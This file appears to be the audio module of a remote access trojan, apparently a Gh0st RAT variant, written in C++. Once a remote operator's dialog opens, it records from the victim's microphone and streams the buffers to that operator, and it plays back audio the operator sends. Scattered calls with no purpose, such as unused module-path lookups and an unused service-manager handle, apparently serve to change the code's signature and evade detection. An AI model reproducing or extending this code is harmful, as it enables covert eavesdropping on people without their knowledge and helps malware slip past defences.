// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "AudioManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CAudioManager::m_bIsWorking = false;

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
    TCHAR szModule[MAX_PATH];

    if (!Initialize())
        return;

    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);

    BYTE	bToken = TOKEN_AUDIO_START;
    Send(&bToken, 1);
    // Wait for remote dialog open and init
    WaitForDialogOpen();

    m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

}

CAudioManager::~CAudioManager()
{
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    m_bIsWorking = false;
    WaitForSingleObject(m_hWorkThread, INFINITE);
    CloseServiceHandle(hSCM);
    delete	m_lpAudio;
}

bool CAudioManager::Initialize()
{
    TCHAR szModule[MAX_PATH];
    if (!waveInGetNumDevs())
        return false;

    // 正在使用中.. 防止重复使用
    if (m_bIsWorking)
        return false;

    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    m_lpAudio = new CAudio;

    m_bIsWorking = true;
    return true;
}

int CAudioManager::sendRecordBuffer()
{
    TCHAR szModule[MAX_PATH];

    DWORD	dwBytes = 0;
    UINT	nSendBytes = 0;
    LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
    if (lpBuffer == NULL)
        return 0;
    LPBYTE	lpPacket = new BYTE[dwBytes + 1];
    lpPacket[0] = TOKEN_AUDIO_DATA;
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    memcpy(lpPacket + 1, lpBuffer, dwBytes);
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);

    if (dwBytes > 0)
        nSendBytes = Send(lpPacket, dwBytes + 1);
    delete	lpPacket;

    return nSendBytes;
}

void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
    {
        NotifyDialogIsOpen();
        return;
    }
    m_lpAudio->playBuffer(lpBuffer, nSize);
}

DWORD WINAPI CAudioManager::WorkThread(LPVOID lparam)
{
    CAudioManager *pThis = (CAudioManager *)lparam;
    while (pThis->m_bIsWorking)
        pThis->sendRecordBuffer();

    return -1;
}
